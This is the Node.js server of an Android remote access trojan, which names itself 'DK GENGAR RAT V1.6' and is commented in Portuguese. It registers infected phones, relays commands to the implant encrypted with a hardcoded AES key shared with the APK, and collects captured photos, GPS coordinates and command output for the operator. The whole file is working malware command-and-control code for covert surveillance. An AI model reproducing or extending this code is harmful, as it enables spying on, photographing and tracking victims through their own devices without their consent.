const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const crypto = require("crypto");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    maxHttpBufferSize: 1e8 // 100MB para fotos
});

// Chave e IV para AES (Devem ser iguais aos do APK)
const SECRET_KEY_STRING = "aGVsbG93b3JsZHNlY3JldGtleQ=="; 
const IV_STRING = "aGVsbG93b3JsZGl2"; 

function decrypt(encryptedValue) {
    try {
        const key = Buffer.from(SECRET_KEY_STRING, 'base64');
        const iv = Buffer.from(IV_STRING, 'base64');
        const encryptedText = Buffer.from(encryptedValue, 'base64');
        const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
        let decrypted = decipher.update(encryptedText);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString();
    } catch (e) {
        return null;
    }
}

function encrypt(value) {
    try {
        const key = Buffer.from(SECRET_KEY_STRING, 'base64');
        const iv = Buffer.from(IV_STRING, 'base64');
        const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
        let encrypted = cipher.update(value, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    } catch (e) {
        return value;
    }
}

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/health", (req, res) => {
    res.status(200).send("OK");
});

io.on("connection", (socket) => {
    console.log("Nova conexão estabelecida");

    socket.on("register", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            console.log("Dispositivo registrado:", data.model);
            io.emit("new_device", data);
        }
    });

    socket.on("command", (data) => {
        console.log("Comando enviado:", data.cmd);
        // Criptografa o comando antes de enviar para o APK
        const encryptedCmd = encrypt(JSON.stringify(data));
        socket.broadcast.emit("command", encryptedCmd);
    });

    socket.on("result", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            io.emit("server_log", data.msg);
        }
    });

    socket.on("photo_captured", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            io.emit("display_photo", data.image);
            io.emit("server_log", "📸 Foto recebida com sucesso!");
        }
    });

    socket.on("location_received", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            io.emit("display_location", data);
            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
        }
    });

    socket.on("disconnect", () => {
        console.log("Conexão encerrada");
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log("DK GENGAR RAT V1.6 rodando na porta " + PORT);
});
